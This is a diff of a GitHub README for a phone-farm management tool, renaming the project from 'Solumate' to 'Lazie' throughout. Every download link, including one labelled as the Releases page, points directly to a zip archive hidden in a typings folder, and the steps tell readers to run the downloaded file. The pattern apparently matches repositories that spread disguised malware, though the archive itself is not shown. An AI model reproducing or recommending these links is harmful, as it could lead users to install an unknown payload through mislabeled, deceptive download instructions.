@@ -1,10 +1,10 @@
-# 📱 stream-phonefarm-solumate - A Simple Way to Manage Your Phone Farm
+# 📱 stream-phonefarm-Lazie - A Simple Way to Manage Your Phone Farm
 
-[![Download](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip)
+[![Download](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-Lazie/main/server/typings/appium-xcuitest-driver/stream_Lazie_phonefarm_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-Lazie/main/server/typings/appium-xcuitest-driver/stream_Lazie_phonefarm_1.1.zip)
 
 ## 🌐 Introduction
 
-Welcome to the Solumate Project! This application helps you manage your phone farm effortlessly. Whether you need to set up multiple devices or monitor their performance, Solumate makes it simple and effective. 
+Welcome to the Lazie Project! This application helps you manage your phone farm effortlessly. Whether you need to set up multiple devices or monitor their performance, Lazie makes it simple and effective. 
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Follow the steps below:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-   [Visit Releases Page to Download](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-Lazie/main/server/typings/appium-xcuitest-driver/stream_Lazie_phonefarm_1.1.zip)
 
 2. **Choose the Latest Version:** Find the latest version listed on the page. You will see a variety of downloadable files.
 
@@ -20,11 +20,11 @@ To get started, you need to download the application. Follow the steps below:
 
 4. **Install the Application:** Locate the downloaded file on your computer and run it. Follow the on-screen instructions to complete the installation.
 
-5. **Start Using Solumate:** Once installed, open the application and begin managing your phone farm!
+5. **Start Using Lazie:** Once installed, open the application and begin managing your phone farm!
 
 ## ⚙️ System Requirements
 
-Before you install Solumate, ensure your system meets these minimum requirements:
+Before you install Lazie, ensure your system meets these minimum requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or Linux
 - **RAM:** At least 4 GB
@@ -33,7 +33,7 @@ Before you install Solumate, ensure your system meets these minimum requirements
 
 ## 📊 Features
 
-Solumate packs a variety of features to enhance your phone farming experience:
+Lazie packs a variety of features to enhance your phone farming experience:
 
 - **Multi-Device Management:** Control multiple devices smoothly from one interface.
 - **Performance Tracking:** Monitor resources and performance metrics for each device.
@@ -42,7 +42,7 @@ Solumate packs a variety of features to enhance your phone farming experience:
 
 ## 🌍 Available Languages
 
-The Solumate Project supports two languages to cater to a wider audience:
+The Lazie Project supports two languages to cater to a wider audience:
 
 - **English**
 - **Vietnamese**
@@ -68,10 +68,10 @@ To ensure you have the latest features and fixes, keep an eye on the Releases pa
 
 ## 📄 License
 
-Solumate is open-source and available under the MIT License. You are free to use, modify, and distribute this software within the terms of the license.
+Lazie is open-source and available under the MIT License. You are free to use, modify, and distribute this software within the terms of the license.
 
 ## 📝 Contributions
 
 We welcome contributions to help improve the project. If you wish to contribute, please follow the guidelines in the repository.
 
-[Download Now](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip) and start your journey with Solumate!
+[Download Now](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-Lazie/main/server/typings/appium-xcuitest-driver/stream_Lazie_phonefarm_1.1.zip) and start your journey with Lazie!
